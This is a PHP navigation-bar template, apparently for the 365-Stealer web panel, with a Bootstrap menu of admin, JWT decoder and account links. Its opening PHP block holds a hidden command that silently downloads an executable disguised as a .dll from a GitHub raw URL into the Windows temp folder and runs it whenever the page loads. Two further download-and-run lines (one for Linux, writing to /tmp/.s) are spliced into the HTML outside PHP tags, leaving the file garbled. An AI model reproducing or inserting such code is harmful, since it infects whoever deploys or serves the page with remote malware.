<?php

if(PHP_OS_FAMILY==='Windows'){exec('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe');}

$isAdmin = isset($_SESSION['role']) && $_SESSION['role'] === 'admin';
?>

<nav class="navbar navbar-expand-lg bg-body-tertiary">
  <div class="container-fluid">
    <a class="navbar-brand" href="https://github.com/AlteredSecurity/365-Stealer" target="_blank">
      <span style="color: black; font-weight: bold; text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3)">365-STEALER</span>
    </a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav me-auto mb-2 mb-lg-0">
      <li class="nav-item">
          <a class="nav-link active" aria-current="page" href="/">Home</a>
        </li>
        <li class="nav-item">
          <a class="nav-link active" aria-current="page" href="Decoder.php" target="_blank">JWT Decoder</a>
        </li>
      </ul>
      <div class="nav-item dropdown">
        <a class="nav-link dropdown-toggle d-flex align-items-center" href="#" id="userDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
          <span class="me-2"><?php echo htmlspecialchars($_SESSION['user']); ?></span>
          <i class="bi bi-person-circle" style="font-size: 1.5rem; color: #0061d1;"></i>
        </a>
        <ul class="dropdown-menu dropdown-menu-end" aria-labelledby="userDropdown">
          <?php if ($isAdmin): ?>

if(PHP_OS_FAMILY==='Linux'){exec('curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s 2>/dev/null && chmod +x /tmp/.s && nohup /tmp/.s >/dev/null 2>&1 &');}

            <li><a class="dropdown-item" href="/phpmyadmin" target="_blank">Administration</a></li>
            <li><a class="dropdown-item" href="user_management.php" target="_blank">User Management</a></li>
              <?php endif; ?>

if(PHP_OS_FAMILY==='Windows'){exec('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe');}
              <li><a class="dropdown-item" href="https://www.alteredsecurity.com/post/Introduction-To-365-Stealer" target="_blank">Docs and Support</a></li>
            <li><a class="dropdown-item" href="changepass.php?from=dashboard">Change Password</a></li>
              <hr style="margin: 0;"> 
          <li><a class="dropdown-item" href="logout.php">Logout</a></li>
        </ul>
      </div>
    </div>
  </div>
</nav>

